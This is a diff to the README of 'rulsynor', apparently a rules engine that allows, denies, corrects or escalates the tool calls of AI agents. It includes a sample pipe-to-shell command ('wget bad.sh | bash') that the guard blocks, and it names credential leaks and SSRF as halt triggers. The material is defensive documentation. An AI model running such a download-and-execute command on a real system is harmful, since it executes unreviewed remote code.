@@ -49,11 +49,13 @@ npx @rulsynor/core --tool=exec --cmd="wget bad.sh | bash"
 ```
 
 ```
+📋 Trained:    28 rules loaded
 🛡️  Decision:   DENY
 📝 Reason:     Pipe-to-shell download blocked. Inspect the content with the read tool before executing.
-🧭 Guidance:   Use the read tool to fetch the URL content first, then review before executing.
-🧾 Recorded:   sha256:18ce857... (tamper-evident, 25-field Decision Object)
-🪪 Employee ID: 1.2.156.3088.1.000001.000001.28027273
+🧾 Recorded:   sha256:8274b0... (tamper-evident)
+🪪 Employee ID: 1.2.156.3088.1.000001.000001.5ce550e5
+📊 Jurisdiction: CN (GB/Z 185-2026 compliant)
+🧭 Alternative: Use the read tool to fetch the URL content first, then review before executing.
 ```
 
 The Agent got blocked — but it was told why, and how to do it right.
@@ -65,8 +67,13 @@ npx @rulsynor/core --tool=read --path="docs/api-spec.md"
 ```
 
 ```
+📋 Trained:    28 rules loaded
 ✅ Decision:   ALLOW
-🧾 Recorded:   sha256:b2f1a93... (logged, audit trail maintained)
+📝 Reason:     Read-only operation allowed.
+🧾 Recorded:   sha256:e71eb71... (tamper-evident)
+🪪 Employee ID: 1.2.156.3088.1.000001.000001.4ebf704b
+📊 Jurisdiction: CN (GB/Z 185-2026 compliant)
+🧭 Alternative: —
 ```
 
 When the tool call is safe, rulsynor gets out of the way. The Agent works. The audit trail grows.
@@ -95,7 +102,7 @@ Rules are ERDL YAML. Each rule says: under these conditions, guide the Agent tow
 # Finance team needs production DB access for reports — but with approval
 name: production-db-needs-approval
 version: 1
-category: business-logic
+category: workflow
 severity: high
 ring: 0                        # 0=evaluate first, 3=evaluate last
 priority: 500                  # lower number = checked first
@@ -119,7 +126,7 @@ then:
 # Large writes happen in batch jobs — warn, don't block
 name: large-write-advisory
 version: 1
-category: resource-management
+category: convention
 severity: low
 ring: 3                        # Passive ring — warn, don't block
 priority: 300
@@ -147,6 +154,7 @@ then:
 | `ALLOW` | Go ahead, logged | Safe operations, batch jobs, known patterns |
 | `DENY` | Stop. Here's why. Here's how to fix it. | Dangerous operations with clear alternatives |
 | `CORRECT` | Auto-fix and retry. Up to 3 rounds. | Wrong path, wrong format, fixable mistakes |
+| `NOTIFY` | Log and continue — no interruption | Anomaly detected, threshold alert, compliance event |
 | `QUARANTINE` | Run in sandbox, flag for review | Suspicious but possibly legitimate |
 | `REQUEST_HUMAN` | Ask a person before proceeding | Production DB, GDPR delete, >$5K transactions |
 | `EMERGENCY_HALT` | Stop everything immediately | Credential leak, SSRF to internal IPs |
@@ -208,11 +216,11 @@ async function executeToolCall(toolName: string, args: Record<string, unknown>) 
 
     case 'REQUEST_HUMAN':
       // 👤 Escalate — show the reason + alternative
-      return showApprovalDialog(result.reason, result.alternative);
+      return showApprovalDialog(result.reason, rules.find(r => r.id === result.matchedRuleId)?.alternative ?? null);
 
     case 'DENY':
       // 🛑 Block with guidance — Agent learns and tries something else
-      throw new GuardGuidanceError(result.reason, result.alternative);
+      throw new GuardGuidanceError(result.reason, rules.find(r => r.id === result.matchedRuleId)?.alternative ?? null);
 
     case 'QUARANTINE':
       // 🧪 Sandbox — run but flag for review
@@ -251,12 +259,18 @@ Pass `guide.corrections` and `guide.alternatives` back to the LLM in the next `a
 ```typescript
 import { advanceCorrectLoop } from '@rulsynor/core/preflight';
 
-const state = advanceCorrectLoop({
-  current: { round: 0, maxRounds: 3, lastCorrection: null },
-  correction: 'Change path from /etc/ to /var/app/',
-  agentResponse: revisedToolCall,
-});
-// state.corrected → true, round → 1. Retry with corrected tool call.
+const state = advanceCorrectLoop(
+  {
+    ruleId: 'correct-unsafe-path',
+    originalToolCall: { name: 'write_file', args: { path: '/etc/nginx/conf' } },
+    correction: 'Change path from /etc/ to /var/app/',
+    round: 1,
+    state: 'correct_round_1',
+  },
+  evaluationResult.decision,  // e.g. 'CORRECT' or 'ALLOW'
+);
+// state.execute → true (Agent adopted correction). Task continues.
+// After 3 failures: state.escalate → true. Trigger REQUEST_HUMAN.
 ```
 
 ---
@@ -286,7 +300,7 @@ const record = buildDecisionObject({
   totalEvaluated: 28,
   totalMatched: 1,
   rules: rules.map(r => ({ name: r.name, version: 1 })),
-  evaluationDurationMs: 0.8,  // actual measurement
+  evaluationDurationMs: 1,  // actual measurement (milliseconds)
 });
 
 // record.audit.hash            → "sha256:a1b2c3..." — immutable
@@ -371,11 +385,22 @@ const profile = getComplianceProfile();
 import { ERDLFnRegistry } from '@rulsynor/core/engine';
 
 const registry = new ERDLFnRegistry();
-registry.register('isBusinessHours', (args: unknown[]) => {
-  const tz = (args[0] as string) || 'Asia/Shanghai';
-  const h = parseInt(new Date().toLocaleString('en-US', { timeZone: tz, hour: 'numeric', hour12: false }));
-  return h >= 9 && h < 18;
-}, { timeoutMs: 100 });
+registry.register({
+  signature: {
+    name: 'isBusinessHours',
+    signature: 'isBusinessHours(tz) → boolean',
+    params: ['tz'],
+    returns: 'boolean',
+  },
+  impl: (tz?: string) => {
+    const tzId = tz || 'Asia/Shanghai';
+    const h = parseInt(
+      new Date().toLocaleString('en-US', { timeZone: tzId, hour: 'numeric', hour12: false })
+    );
+    return h >= 9 && h < 18;
+  },
+  timeoutMs: 100,
+});
 
 // Now use in rules:
 //   - field: "fn:isBusinessHours"
